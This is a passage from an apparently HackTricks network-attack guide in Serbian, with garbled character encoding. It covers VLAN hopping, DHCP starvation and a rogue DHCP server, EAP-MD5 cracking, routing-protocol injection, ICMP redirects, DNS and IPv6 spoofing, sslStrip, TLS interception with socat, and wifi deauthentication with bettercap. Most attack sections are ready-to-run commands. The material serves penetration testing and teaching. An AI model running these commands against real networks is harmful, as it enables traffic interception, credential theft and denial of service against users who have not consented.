VoIP telefoni, sve viÅ¡e integrisani sa IoT ureÄ‘ajima, nude funkcionalnosti kao Å¡to su otkljuÄavanje vrata ili kontrola termostata putem posebnih brojeva telefona. MeÄ‘utim, ova integracija moÅ¾e predstavljati sigurnosne rizike.

Alat [**voiphopper**](http://voiphopper.sourceforge.net) je dizajniran da emulira VoIP telefon u raznim okruÅ¾enjima (Cisco, Avaya, Nortel, Alcatel-Lucent). Otkriva VLAN ID glasovne mreÅ¾e koristeÄ‡i protokole kao Å¡to su CDP, DHCP, LLDP-MED i 802.1Q ARP.

**VoIP Hopper** nudi tri moda za Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analizira mreÅ¾ne pakete kako bi identifikovao VLAN ID.
2. **Spoof Mode** (`-c 1`): GeneriÅ¡e prilagoÄ‘ene pakete koji imituju one stvarnog VoIP ureÄ‘aja.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Å alje pakete identiÄne onima odreÄ‘enog Cisco IP telefonskog modela.

Preferirani mod za brzinu je treÄ‡i. Zahteva specificiranje:

* MreÅ¾nog interfejsa napadaÄa (`-i` parametar).
* Imena VoIP ureÄ‘aja koji se emulira (`-E` parametar), u skladu sa Cisco formatom imenovanja (npr. SEP praÄ‡eno MAC adresom).

U korporativnim okruÅ¾enjima, da bi se imitirao postojeÄ‡i VoIP ureÄ‘aj, moÅ¾e se:

* Ispitati MAC oznaku na telefonu.
* Navigirati podeÅ¡avanjima prikaza telefona da bi se videli podaci o modelu.
* Povezati VoIP ureÄ‘aj na laptop i posmatrati CDP zahteve koristeÄ‡i Wireshark.

Primer komande za izvrÅ¡avanje alata u treÄ‡em modu bio bi:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Napadi

#### Enumeracija
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Dva tipa DoS** mogu se izvesti protiv DHCP servera. Prvi se sastoji od **simuliranja dovoljno laÅ¾nih hostova da se iskoriste sve moguÄ‡e IP adrese**.\
Ovaj napad Ä‡e raditi samo ako moÅ¾ete videti odgovore DHCP servera i zavrÅ¡iti protokol (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Na primer, ovo je **nemoguÄ‡e u Wifi mreÅ¾ama**.

Drugi naÄin za izvoÄ‘enje DHCP DoS je slanje **DHCP-RELEASE paketa koristeÄ‡i kao izvorni kod svaku moguÄ‡u IP adresu**. Tada Ä‡e server pomisliti da su svi zavrÅ¡ili sa koriÅ¡Ä‡enjem IP adrese.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Jedan automatskiji naÄin za to je koriÅ¡Ä‡enje alata [DHCPing](https://github.com/kamorin/DHCPig)

MoÅ¾ete koristiti pomenute DoS napade da primorate klijente da dobiju nove zakupnine unutar okruÅ¾enja i iscrpite legitimne servere tako da postanu neodgovorni. Tako kada se legitimni pokuÅ¡aju ponovo povezati, **moÅ¾ete posluÅ¾iti zlonamerne vrednosti pomenute u sledeÄ‡em napadu**.

#### Postavljanje zlonamernih vrednosti

Rogue DHCP server moÅ¾e biti postavljen koristeÄ‡i DHCP skriptu koja se nalazi na `/usr/share/responder/DHCP.py`. Ovo je korisno za mreÅ¾ne napade, poput hvatanja HTTP saobraÄ‡aja i kredencijala, preusmeravanjem saobraÄ‡aja na zlonamerni server. MeÄ‘utim, postavljanje rogue gateway-a je manje efikasno jer omoguÄ‡ava samo hvatanje izlaznog saobraÄ‡aja sa klijenta, propuÅ¡tajuÄ‡i odgovore sa pravog gateway-a. Umesto toga, preporuÄuje se postavljanje rogue DNS ili WPAD servera za efikasniji napad.

Ispod su opcije komandi za konfiguraciju rogue DHCP servera:

* **NaÅ¡a IP adresa (Gateway Advertisement)**: Koristite `-i 10.0.0.100` da reklamirate IP vaÅ¡e maÅ¡ine kao gateway.
* **Lokalno DNS ime domena**: Opcionalno, koristite `-d example.org` da postavite lokalno DNS ime domena.
* **Originalni Router/Gateway IP**: Koristite `-r 10.0.0.1` da navedete IP adresu legitimnog rutera ili gateway-a.
* **Primarna DNS Server IP**: Koristite `-p 10.0.0.100` da postavite IP adresu rogue DNS servera koji kontroliÅ¡ete.
* **Sekundarna DNS Server IP**: Opcionalno, koristite `-s 10.0.0.1` da postavite sekundarnu DNS server IP.
* **MreÅ¾na maska lokalne mreÅ¾e**: Koristite `-n 255.255.255.0` da definiÅ¡ete mreÅ¾nu masku za lokalnu mreÅ¾u.
* **Interfejs za DHCP saobraÄ‡aj**: Koristite `-I eth1` da sluÅ¡ate DHCP saobraÄ‡aj na odreÄ‘enom mreÅ¾nom interfejsu.
* **WPAD konfiguraciona adresa**: Koristite `-w â€œhttp://10.0.0.100/wpad.datâ€` da postavite adresu za WPAD konfiguraciju, pomaÅ¾uÄ‡i u presretanju web saobraÄ‡aja.
* **LaÅ¾iranje IP adrese podrazumevanog gateway-a**: UkljuÄite `-S` da laÅ¾irate IP adresu podrazumevanog gateway-a.
* **Odgovarajte na sve DHCP zahteve**: UkljuÄite `-R` da server odgovara na sve DHCP zahteve, ali budite svesni da je ovo buÄno i moÅ¾e biti otkriveno.

Ispravnim koriÅ¡Ä‡enjem ovih opcija, rogue DHCP server moÅ¾e biti uspostavljen za efikasno presretanje mreÅ¾nog saobraÄ‡aja.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP napadi**

Evo nekih od taktika napada koje se mogu koristiti protiv 802.1X implementacija:

* Aktivno brute-force otkrivanje lozinki putem EAP
* Napad na RADIUS server sa neispravnim EAP sadrÅ¾ajem _\*\*_(eksploati)
* Snimanje EAP poruka i offline otkrivanje lozinki (EAP-MD5 i PEAP)
* Prisiljavanje EAP-MD5 autentifikacije da zaobiÄ‘e TLS validaciju sertifikata
* Umetanje zlonamernog mreÅ¾nog saobraÄ‡aja prilikom autentifikacije koristeÄ‡i hub ili sliÄno

Ako je napadaÄ izmeÄ‘u Å¾rtve i servera za autentifikaciju, mogao bi pokuÅ¡ati da degradira (ako je potrebno) autentifikacioni protokol na EAP-MD5 i snimi pokuÅ¡aj autentifikacije. Zatim bi mogao da koristi brute-force za ovo:
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) je klasa mreÅ¾nih protokola dizajniranih da **kreiraju vruÄ‡i redundantni sistem rutiranja**. Sa FHRP-om, fiziÄki ruteri mogu biti kombinovani u jedan logiÄki ureÄ‘aj, Å¡to poveÄ‡ava otpornost na greÅ¡ke i pomaÅ¾e u raspodeli optereÄ‡enja.

**InÅ¾enjeri Cisco Systems-a su razvili dva FHRP protokola, GLBP i HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Poznate su tri verzije Protokola za informisanje o rutiranju (RIP): RIP, RIPv2 i RIPng. Datagrami se Å¡alju partnerima putem porta 520 koristeÄ‡i UDP kod RIP i RIPv2, dok se datagrami emitiraju na UDP port 521 putem IPv6 multicast kod RIPng. PodrÅ¡ka za MD5 autentifikaciju je uvedena RIPv2. S druge strane, nativna autentifikacija nije ukljuÄena u RIPng; umesto toga, oslanja se na opcione IPsec AH i ESP zaglavlja unutar IPv6.

* **RIP i RIPv2:** Komunikacija se vrÅ¡i putem UDP datagrama na portu 520.
* **RIPng:** Koristi UDP port 521 za emitovanje datagrama putem IPv6 multicast.

Napomena: RIPv2 podrÅ¾ava MD5 autentifikaciju dok RIPng ne ukljuÄuje nativnu autentifikaciju, oslanjajuÄ‡i se na IPsec AH i ESP zaglavlja u IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** je dinamiÄki protokol rutiranja. **To je protokol zasnovan na udaljenosti.** Ako nema **autentifikacije** i konfiguracije pasivnih interfejsa, **napadaÄ** moÅ¾e ometati EIGRP rutiranje i izazvati **trovanje tabela rutiranja**. Å taviÅ¡e, EIGRP mreÅ¾a (drugim reÄima, autonomni sistem) **je ravna i nema segmentaciju u bilo koje zone**. Ako **napadaÄ ubaci rutu**, verovatno Ä‡e se ova ruta **proÅ¡iriti** kroz autonomni EIGRP sistem.

Napad na EIGRP sistem zahteva **uspostavljanje komÅ¡iluka sa legitimnim EIGRP ruterom**, Å¡to otvara mnoge moguÄ‡nosti, od osnovne rekognosciranja do raznih injekcija.

[**FRRouting**](https://frrouting.org/) vam omoguÄ‡ava da implementirate **virtuelni ruter koji podrÅ¾ava BGP, OSPF, EIGRP, RIP i druge protokole.** Sve Å¡to treba da uradite je da ga postavite na sistem napadaÄa i zapravo moÅ¾ete da se pretvarate da ste legitimni ruter u rutirajuÄ‡em domenu.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) ima moguÄ‡nosti za presretanje EIGRP (Enhanced Interior Gateway Routing Protocol) emitovanja. TakoÄ‘e omoguÄ‡ava injekciju paketa, Å¡to se moÅ¾e koristiti za izmene konfiguracija rutiranja.

### OSPF

U protokolu Open Shortest Path First (OSPF) **MD5 autentifikacija se obiÄno koristi za obezbeÄ‘ivanje sigurne komunikacije izmeÄ‘u rutera**. MeÄ‘utim, ova sigurnosna mera moÅ¾e biti kompromitovana koriÅ¡Ä‡enjem alata kao Å¡to su Loki i John the Ripper. Ovi alati su sposobni da hvataju i razbijaju MD5 heÅ¡ove, otkrivajuÄ‡i autentifikacioni kljuÄ. Kada se ovaj kljuÄ dobije, moÅ¾e se koristiti za uvoÄ‘enje novih informacija o rutiranju. Za konfiguraciju parametara rute i uspostavljanje kompromitovanog kljuÄa koriste se _Injection_ i _Connection_ kartice, redom.

* **Hvatanje i razbijanje MD5 heÅ¡ova:** Alati kao Å¡to su Loki i John the Ripper se koriste u tu svrhu.
* **Konfiguracija parametara rute:** Ovo se vrÅ¡i putem _Injection_ kartice.
* **Postavljanje kompromitovanog kljuÄa:** KljuÄ se konfiguriÅ¡e pod _Connection_ karticom.

### Other Generic Tools & Sources

* [**Above**](https://github.com/c4s73r/Above): Alat za skeniranje mreÅ¾nog saobraÄ‡aja i pronalaÅ¾enje ranjivosti
* MoÅ¾ete pronaÄ‡i neke **dodatne informacije o mreÅ¾nim napadima** [**ovde**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

NapadaÄ konfiguriÅ¡e sve mreÅ¾ne parametre (GW, IP, DNS) novog Älana mreÅ¾e Å¡aljuÄ‡i laÅ¾ne DHCP odgovore.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Proverite [prethodni odeljak](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect se sastoji od slanja ICMP paketa tipa 1 kod 5 koji ukazuje da je napadaÄ najbolji naÄin za pristup IP-u. Tada, kada Å¾rtva Å¾eli da kontaktira IP, poslaÄ‡e paket kroz napadaÄa.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

NapadaÄ Ä‡e reÅ¡iti neke (ili sve) domene koje Å¾rtva traÅ¾i.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**KonfiguriÅ¡ite vlastiti DNS sa dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokalne Gejtove

ViÅ¡e ruta do sistema i mreÅ¾a Äesto postoji. Nakon izrade liste MAC adresa unutar lokalne mreÅ¾e, koristite _gateway-finder.py_ da identifikujete hostove koji podrÅ¾avaju IPv4 prosleÄ‘ivanje.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Za lokalno reÅ¡avanje hostova kada DNS pretrage nisu uspeÅ¡ne, Microsoft sistemi se oslanjaju na **Link-Local Multicast Name Resolution (LLMNR)** i **NetBIOS Name Service (NBT-NS)**. SliÄno tome, **Apple Bonjour** i **Linux zero-configuration** implementacije koriste **Multicast DNS (mDNS)** za otkrivanje sistema unutar mreÅ¾e. Zbog neautentifikovane prirode ovih protokola i njihove operacije preko UDP, emitovanjem poruka, mogu ih iskoristiti napadaÄi koji imaju za cilj da preusmere korisnike na zlonamerne usluge.

MoÅ¾ete se pretvarati da ste usluge koje traÅ¾e hostovi koristeÄ‡i Responder za slanje laÅ¾nih odgovora.\
ProÄitajte ovde viÅ¡e informacija o [kako se pretvarati da ste usluge sa Responder-om](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

PregledaÄi obiÄno koriste **Web Proxy Auto-Discovery (WPAD) protokol za automatsko preuzimanje proxy podeÅ¡avanja**. To ukljuÄuje preuzimanje konfiguracionih detalja sa servera, posebno putem URL-a kao Å¡to je "http://wpad.example.org/wpad.dat". OtkriÄ‡e ovog servera od strane klijenata moÅ¾e se dogoditi kroz razliÄite mehanizme:

* Kroz **DHCP**, gde se otkrivanje olakÅ¡ava koriÅ¡Ä‡enjem posebnog koda 252.
* Preko **DNS**, Å¡to ukljuÄuje pretragu za imenom hosta oznaÄenim kao _wpad_ unutar lokalne domene.
* Putem **Microsoft LLMNR i NBT-NS**, koji su mehanizmi povratne veze koriÅ¡Ä‡eni u sluÄajevima kada DNS pretrage ne uspevaju.

Alat Responder koristi ovaj protokol delujuÄ‡i kao **zlonameran WPAD server**. Koristi DHCP, DNS, LLMNR i NBT-NS da zavara klijente da se poveÅ¾u sa njim. Da biste dublje istraÅ¾ili kako se usluge mogu pretvarati koristeÄ‡i Responder [proverite ovo](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

MoÅ¾ete ponuditi razliÄite usluge u mreÅ¾i kako biste pokuÅ¡ali da **prevarite korisnika** da unese neke **plain-text kredencijale**. **ViÅ¡e informacija o ovom napadu u** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Ovaj napad je vrlo sliÄan ARP Spoofingu, ali u svetu IPv6. MoÅ¾ete navesti Å¾rtvu da pomisli da IPv6 GW ima MAC adresu napadaÄa.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Neki operativni sistemi podrazumevano konfiguriÅ¡u gateway iz RA paketa poslatih u mreÅ¾i. Da biste proglasili napadaÄa kao IPv6 ruter, moÅ¾ete koristiti:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Podrazumevano, neki operativni sistemi pokuÅ¡avaju da konfiguriÅ¡u DNS ÄitajuÄ‡i DHCPv6 paket u mreÅ¾i. Tada bi napadaÄ mogao poslati DHCPv6 paket da se konfiguriÅ¡e kao DNS. DHCP takoÄ‘e obezbeÄ‘uje IPv6 Å¾rtvi.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (laÅ¾na stranica i JS kod injekcija)

## Internet napadi

### sslStrip

U suÅ¡tini, ono Å¡to ovaj napad radi je da, u sluÄaju da **korisnik** pokuÅ¡a da **pristupi** **HTTP** stranici koja se **preusmerava** na **HTTPS** verziju. **sslStrip** Ä‡e **odrÅ¾avati** **HTTP vezu sa** **klijentom i** **HTTPS vezu sa** **serverom** tako da Ä‡e moÄ‡i da **snifa** vezu u **Äistom tekstu**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
ViÅ¡e informacija [ovde](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ i dns2proxy za zaobilaÅ¾enje HSTS

**Razlika** izmeÄ‘u **sslStrip+ i dns2proxy** u odnosu na **sslStrip** je u tome Å¡to Ä‡e **preusmeriti** na primer _**www.facebook.com**_ **na** _**wwww.facebook.com**_ (obratite paÅ¾nju na **dodatno** "**w**") i postaviÄ‡e **adresu ovog domena kao IP napadaÄa**. Na taj naÄin, **klijent** Ä‡e se **povezati** na _**wwww.facebook.com**_ **(napadaÄ)**, ali u pozadini **sslstrip+** Ä‡e **odrÅ¾avati** **pravu vezu** putem https sa **www.facebook.com**.

**Cilj** ove tehnike je da se **izbegne HSTS** jer _**wwww**.facebook.com_ **neÄ‡e** biti saÄuvan u **keÅ¡u** pretraÅ¾ivaÄa, tako da Ä‡e pretraÅ¾ivaÄ biti prevaren da izvrÅ¡i **facebook autentifikaciju u HTTP**.\
Napomena: da bi se izvrÅ¡io ovaj napad, Å¾rtva mora prvo pokuÅ¡ati da pristupi [http://www.faceook.com](http://www.faceook.com) a ne https. To se moÅ¾e uraditi modifikovanjem linkova unutar http stranice.

ViÅ¡e informacija [ovde](https://www.bettercap.org/legacy/#hsts-bypass), [ovde](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) i [ovde](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ili sslStrip+ viÅ¡e ne funkcioniÅ¡u. To je zato Å¡to postoje HSTS pravila unapred saÄuvana u pretraÅ¾ivaÄima, tako da Äak i ako je prvi put da korisnik pristupa "vaÅ¾nom" domenu, on Ä‡e mu pristupiti putem HTTPS. TakoÄ‘e, obratite paÅ¾nju da unapred saÄuvana pravila i druga generisana pravila mogu koristiti oznaku** [**`includeSubdomains`**](https://hstspreload.appspot.com) **tako da** _**wwww.facebook.com**_ **primer iz prethodnog dela viÅ¡e neÄ‡e raditi jer** _**facebook.com**_ **koristi HSTS sa `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP sluÅ¡anje na portu
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL sluÅ¡anje na portu

#### GeneriÅ¡ite kljuÄeve i samopotpisani sertifikat
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### SluÅ¡anje pomoÄ‡u sertifikata
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### SluÅ¡anje koristeÄ‡i sertifikat i preusmeravanje na hostove
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Nekada, ako klijent proveri da li je CA validan, mogli biste **posluÅ¾iti sertifikat drugog imena hosta potpisan od strane CA**.\
JoÅ¡ jedan zanimljiv test je da posluÅ¾ite **sertifikat traÅ¾enog imena hosta, ali samopotpisan**.

Druge stvari koje treba testirati su pokuÅ¡aj potpisivanja sertifikata sa validnim sertifikatom koji nije validan CA. Ili koriÅ¡Ä‡enje validnog javnog kljuÄa, primoravanje na koriÅ¡Ä‡enje algoritma kao Å¡to je diffie hellman (onog koji ne zahteva deÅ¡ifrovanje bilo Äega sa pravim privatnim kljuÄem) i kada klijent zatraÅ¾i probe pravog privatnog kljuÄa (kao Å¡to je hash) poslati laÅ¾nu probu i oÄekivati da klijent to ne proveri.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Active Discovery Notes

Imajte na umu da kada se UDP paket poÅ¡alje ureÄ‘aju koji nema traÅ¾eni port, Å¡alje se ICMP (Port Unreachable).

### **ARP discover**

ARP paketi se koriste za otkrivanje koji IP-ovi se koriste unutar mreÅ¾e. PC mora poslati zahtev za svaku moguÄ‡u IP adresu i samo oni koji se koriste Ä‡e odgovoriti.

### **mDNS (multicast DNS)**

Bettercap Å¡alje MDNS zahtev (svakih X ms) traÅ¾eÄ‡i **\_services\_.dns-sd.\_udp.local** maÅ¡ina koja vidi ovaj paket obiÄno odgovara na ovaj zahtev. Zatim, samo traÅ¾i maÅ¡ine koje odgovaraju na "services".

**Tools**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap emituje pakete na port 137/UDP traÅ¾eÄ‡i ime "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap emituje SSDP pakete traÅ¾eÄ‡i sve vrste usluga (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap emituje WSD pakete traÅ¾eÄ‡i usluge (UDP Port 3702).

## References

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
